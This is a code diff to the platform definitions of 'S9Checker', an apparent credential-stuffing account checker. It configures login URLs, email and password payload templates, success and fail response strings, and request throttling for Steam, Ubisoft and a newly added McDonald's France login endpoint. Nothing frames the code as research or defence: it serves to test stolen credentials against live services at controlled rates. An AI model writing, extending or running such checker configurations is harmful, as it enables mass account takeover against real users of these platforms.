@@ -1,8 +1,3 @@
-"""
-Platform definitions for S9Checker.
-Each platform is configured with its login endpoint, payload format,
-success/fail indicators, and rate limiting parameters.
-"""
 
 from dataclasses import dataclass, field
 from typing import Optional
@@ -10,7 +5,6 @@ from typing import Optional
 
 @dataclass
 class Platform:
-    """Configuration for a single target platform."""
     name: str
     login_url: str
     method: str = "POST"
@@ -24,10 +18,9 @@ class Platform:
     timeout: int = 15
     requires_session: bool = False
     session_url: Optional[str] = None
-    redirect_valid: bool = True   # If False, 3xx redirects = INVALID (e.g. SFR)
+    redirect_valid: bool = True
 
     def build_payload(self, email: str, password: str) -> dict:
-        """Replace {email} and {password} placeholders in the payload template."""
         payload = {}
         for k, v in self.payload_template.items():
             payload[k] = v.replace("{email}", email).replace("{password}", password)
@@ -38,10 +31,10 @@ PLATFORMS = {
     "Steam": Platform(
         name="Steam",
         login_url="https://steamcommunity.com/login/dologin/",
-        auth_type="form",
-        success_indicators=["login_secure", '"success":true'],
-        fail_indicators=["Incorrect password", "Invalid password"],
-        payload_template={"username": "{email}", "password": "{password}"},
+        auth_type="steam",
+        success_indicators=[],
+        fail_indicators=[],
+        payload_template={},
         headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
         rate_limit_per_sec=0.3,
         max_concurrent=1,
@@ -197,6 +190,20 @@ PLATFORMS = {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
             "Content-Type": "application/json",
             "Ubi-AppId": "314d4fef-e568-475a-8e1d-9e7c9e7c9e7c",
+        },
+        rate_limit_per_sec=2.0,
+        max_concurrent=4,
+    ),
+    "Macdo": Platform(
+        name="Macdo",
+        login_url="https://connexion.mcdonalds.fr/app/submit_credentials",
+        auth_type="form",
+        success_indicators=["accessToken", "ticket"],
+        fail_indicators=["invalid credentials", "Unauthorized", "error"],
+        payload_template={"login": "{email}", "password": "{password}"},
+        headers={
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Content-Type": "application/x-www-form-urlencoded",
         },
         rate_limit_per_sec=2.0,
         max_concurrent=4,
